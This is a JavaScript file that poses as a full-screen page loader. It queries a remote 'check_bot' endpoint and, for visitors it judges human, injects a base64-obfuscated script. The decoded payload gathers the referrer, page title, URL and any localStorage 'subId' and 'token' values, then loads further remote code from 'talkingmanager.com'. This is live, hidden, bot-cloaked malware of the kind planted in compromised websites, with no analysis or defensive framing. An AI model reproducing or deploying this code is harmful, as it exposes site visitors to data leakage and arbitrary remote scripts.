const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
window.addEventListener('DOMContentLoaded', () => {
    createLoader();
    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            const script = document.createElement('script');
            script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfZHFNd0xCTDh4dHkyMWg0Wic7CiAgICBpZiAoIXdpbmRvdy5fZHFNd0xCTDh4dHkyMWg0WikgewogICAgICAgIHdpbmRvdy5fZHFNd0xCTDh4dHkyMWg0WiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vVFpDZ1Z6emInLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfSlNYeTdyVm5Kc2RNVjVydCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX0pTWHk3clZuSnNkTVY1cnQgIT09ICd1bmRlZmluZWQnICYmIF9KU1h5N3JWbkpzZE1WNXJ0ICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF90cFhES0ZIWDI5N1pDdnEzID0gSlNPTi5wYXJzZShfSlNYeTdyVm5Kc2RNVjVydCk7CiAgICAgICAgdmFyIF84dk5Ma2tndEx3ckd6bnRRID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX3RwWERLRkhYMjk3WkN2cTMuY3JlYXRlZF9hdCArIHdpbmRvdy5fZHFNd0xCTDh4dHkyMWg0Wi50dGwgPCBfOHZOTGtrZ3RMd3JHem50USkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX3pMNlFOS1c5VnZDNDJ3TEYgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfYkd2N2tWWllnN0Y4YzVLWiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9nTVQ0UDF0RHNOWUcycUpjID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfZ01UNFAxdERzTllHMnFKYyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfZ01UNFAxdERzTllHMnFKYyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9nTVQ0UDF0RHNOWUcycUpjICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9nTVQ0UDF0RHNOWUcycUpjICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfZ01UNFAxdERzTllHMnFKYyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfZ01UNFAxdERzTllHMnFKYyArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX2RxTXdMQkw4eHR5MjFoNFouUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX3pMNlFOS1c5VnZDNDJ3TEYgIT09ICd1bmRlZmluZWQnICYmIF96TDZRTktXOVZ2QzQyd0xGICYmIHdpbmRvdy5fZHFNd0xCTDh4dHkyMWg0Wi51bmlxdWUpIHsKICAgICAgICBfZ01UNFAxdERzTllHMnFKYyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF96TDZRTktXOVZ2QzQyd0xGKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX2JHdjdrVlpZZzdGOGM1S1ogIT09ICd1bmRlZmluZWQnICYmIF9iR3Y3a1ZaWWc3RjhjNUtaICYmIHdpbmRvdy5fZHFNd0xCTDh4dHkyMWg0Wi51bmlxdWUpIHsKICAgICAgICBfZ01UNFAxdERzTllHMnFKYyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX2JHdjdrVlpZZzdGOGM1S1opOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF9nTVQ0UDF0RHNOWUcycUpjICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fZHFNd0xCTDh4dHkyMWg0Wi5SX1BBVEggKyBfZ01UNFAxdERzTllHMnFKYzsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
             document.querySelector("head").appendChild(script);
        }
        toggleLoad();
        
    })
})
